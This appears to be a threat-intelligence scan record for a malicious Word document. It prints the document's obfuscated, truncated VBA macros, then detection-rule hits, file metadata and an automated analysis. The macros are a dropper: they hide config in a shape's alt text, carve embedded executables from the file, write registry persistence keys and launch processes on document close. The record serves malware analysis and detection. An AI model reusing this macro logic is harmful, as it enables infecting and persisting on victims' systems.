macros.vba_code:
Option Explicit

Private Sub Document_Close()
    On Error Resume Next
    #If Win64 = 1 Or Win32 = 1 Then
    #Else
        Exit Sub
    #End If

    ini
    
    If nl = 2 Then
        Exit Sub
    End If
    
    t1 exec & tsk
    
    t1 exec1
    
End Sub

Private Sub Document_Open()
    On Error Resume Next
    
    ThisDocument.ActiveWindow.View.Type = wdPrintView
    nl = 1
    #If Win64 = 1 Or Win32 = 1 Then
    #Else
        Exit Sub
    #End If
    
    ini
    exec = VBA.Environ(wdr)
    exec1 = VBA.Environ(wdr)
    
    If IsU = True Or fso.FileExists(VBA.Environ(dfo) & "\" & prot & "\" & dna) = True Then
        u
        nl = 2
        Exit Sub
    End If
    
    fso.CreateFolder VBA.Environ(dfo) & "\" & prot
    
    SRW
    
    fso.CopyFile ThisDocument.Path & "\" & ThisDocument.name, VBA.Environ("Temp") & "\" & obj
    t0
    fso.CopyFile VBA.Environ("Temp") & "\" & tmpd, VBA.Environ(dfo) & "\" & prot & "\" & dna
    
    u
    
End Sub

Option Explicit

#If Win64 = 1 Or Win32 = 1 Then
    #If VBA7 = 1 Then
        Public Type PI
            hP        As LongPtr
            hT         As LongPtr
            dPI     As Long
            dTI      As Long
        End Type
    
        Public Type SI
            cb              As Long
            lR      As LongPtr
            lD       As LongPtr
            lT         As LongPtr
            dX             As Long
            dY             As Long
            dXS         As Long
            dYS         As Long
            dXCC   As Long
            dYCC   As Long
            dFA As Long
            dF         As Long
            wSW     As Integer
            cR2     As Integer
            lR2     As Byte
            hSI       As LongPtr
            hSO      As LongPtr
            hSE       As LongPtr
        End Type
    
        Public Declare PtrSafe Function CP Lib "kernel32" Alias "CreateProcessW" ( _

Option Explicit

Const HKEY_CURRENT_USER = &H80000001
Const REG_EXPAND_SZ = 2
Const KEY_WRITE = &H20106

Function rb(file) As Byte()
    Dim stream: Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.LoadFromFile (file)
    rb = stream.Read()
    stream.Close
End Function

Function sp(src() As Byte) As Long
    sp = -1
    If VBA.LenB(src) < 5 Then Exit Function
    
    Dim i As Long
    
    For i = 1 To VBA.LenB(src) - 5
        If (src(i) = &H4D) And (src(i + 1) = &H5A) And (src(i + 2) = &H90) Then
            sp = i
            Exit For
        End If
    Next
End Function

Sub SRW()
    Dim hKey As Long
    Dim ret As Long
    Dim sValue As String
    
    exec = exec & "\" & s32 & "\"
    exec1 = exec1 & "\" & tsk
    
    sValue = VBA.StrConv(arg3, vbUnicode)
    
    ret = RCKE(HKEY_CURRENT_USER, VBA.StrConv(arg1 & arg2, vbUnicode), 0, vbNullString, 0, KEY_WRITE, 0, hKey, 0)
    If ret = 0 Then
        ret = RSVE(hKey, vbNullString, 0, REG

Option Explicit

Public obj As String
Public tmpd As String
Public pfo As String
Public dfo As String
Public dna As String
Public pna As String
Public arg1 As String
Public arg2 As String
Public arg3 As String
Public prot As String
Public tskkl As String
Public tsk As String
Public exec As String
Public exec1 As String
Public nl As Long

Public fso As Object

Public wdr As String
Public s32 As String

Public streamA As Object
Public streamB As Object

Private Const SUq As Long = &H1
Private Const SUHq As Long = &H100
Private Const SHq As Integer = 0

Sub ini()
    Set fso = CreateObject("Scripting.Fil" & "eSystemObject")
    
    s32 = "syst"
    
    Dim v() As String
    v = Split(ThisDocument.Shapes(1).AlternativeText, vbNewLine)
    obj = v(0)
    dfo = v(1)
    dna = v(2)
    pfo = v(3)
    pna = v(4)
    tmpd = v(5)
    arg1 = v(6)
    arg2 = v(7)
    arg3 = v(8)
    prot = v(9)
    tskkl = v(10)
    tsk = v(11)
    wdr = v(12)
    
    s32 = s32 & "em32"
    
    Set streamA = C

sigma_analysis_results.rule_title: File With Uncommon Extension Created By An Office Application
sigma_analysis_results.rule_description: Detects the creation of files with an executable or script extension by an Office application.
sigma_analysis_results.rule_author: Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule), Nasreddine Bencherchali (Nextron Systems)

sigma_analysis_results.rule_title: Office Application Initiated Network Connection To Non-Local IP
sigma_analysis_results.rule_description:
Detects an office application (Word, Excel, PowerPoint)  that initiate a network connection to a non-private IP addresses.
This rule aims to detect traffic similar to one seen exploited in CVE-2021-42292.
This rule will require an initial baseline and tuning that is specific to your organization.
sigma_analysis_results.rule_author: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Florian Roth (Nextron Systems), Tim Shelton, Nasreddine Bencherchali (Nextron Systems)

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.
Detects the creation of a new office macro files on the systems

crowdsourced_yara_results.description: This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

attributes.magic: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: User, Template: Normal.dotm, Last Saved By: Bruno, Revision Number: 11, Name of Creating Application: Microsoft Office Word, Total Editing Time: 07:00, Last Printed: Fri Apr 25 02:05:00 2025, Create Time/Date: Mon Jun 16 07:49:00 2025, Last Saved Time/Date: Thu Jun 19 09:53:00 2025, Number of Pages: 1, Number of Words: 155, Number of Characters: 890, Security: 0

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ai_results.analysis: The macros start by setting the ActiveWindow's View Type to wdPrintView when the document opens. It reads strings from the AlternativeText property of the first shape in the document. These strings are used for file paths, names, and arguments. It creates a folder using one of the extracted strings. The macro copies the current document to the Temp directory. It then copies a file from the Temp directory to a newly created folder, using another extracted string for the new file's name. The code contains a function that iterates through the characters of the document and attempts to XOR each third character, if its ASCII code is 49 (representing the number 1), with the hexadecimal value &H35 (decimal 53). The SRW subroutine creates or modifies a registry entry under HKEY_CURRENT_USER using string values obtained from the document shape. The t0 subroutine reads the bytes of the document copied to the temp folder and extracts two chunks of data from it, writing them to two separate files, using file sizes of 201216 and 294281 bytes. One of these files is placed in the directory specified by the 'pfo' string, which is extracted from the document shape. Finally, the t1 subroutine executes a process using CreateProcessW. The executable path and arguments are composed using environment variables and strings extracted from the document shape.

The provided macros exhibit several behaviors commonly associated with malicious intent. Below is a detailed breakdown of the macro functionality:

1. Document_Open() and Document_Close() Subroutines:
   - The `Document_Open()` subroutine sets the document view to print mode and initializes various variables using environment variables. It checks for certain conditions (like the existence of a file) and creates folders, which could be used for storing malicious payloads.
   - The `Document_Close()` subroutine executes commands that are likely intended to run additional code or scripts when the document is closed.

2. File System Manipulation:
   - The use of `fso` (FileSystemObject) indicates that the macros interact with the file system. This includes creating directories and copying files, which can be indicative of attempts to install malware or persistently store malicious components on the system.

3. Registry Manipulation:
   - The `SRW()` subroutine contains calls to Windows API functions (`RegCreateKeyExW` and `RegSetValueExW`) to create and set registry values. This behavior is often associated with persistence mechanisms where malware modifies the registry to ensure it runs on startup or maintains control over the system.

4. Execution of External Processes:
   - The `t1(exec As String)` subroutine uses the `CreateProcessW` function to execute external processes. This is a clear indicator of potentially executing downloaded or locally stored malicious executables.

5. Obfuscation Techniques:
   - The macros utilize obfuscated variable names and structures, such as `exec`, `tsk`, and `dna`, which can make it difficult to understand their true purpose at first glance. This is a common tactic in malware to evade detection.

6. Byte Manipulation and File Handling:
   - The `rb(file)` function reads bytes from a specified file, while the `sp(src())` function appears to search for specific byte patterns, possibly indicating an attempt to identify executable files or other malicious payloads within the data.
   - The `t0()` subroutine manipulates file contents based on byte positions, suggesting that the macro may be attempting to extract or modify parts of executable files.

7. Potentially Malicious Payloads:
   - The presence of constants like `HKEY_CURRENT_USER` and permissions for writing to the registry suggests that the macros are designed to install or configure something that requires elevated privileges, further indicating malicious intent.

8. XOR Encoding:
   - The `u()` subroutine performs XOR operations on characters in the document, which is a common technique used to obfuscate data or hide malicious instructions.

Overall, the combination of file manipulation, registry modifications, execution of external processes, and obfuscation techniques strongly indicates that these macros are designed with malicious intent, likely aimed at compromising the host system or executing unauthorized actions.
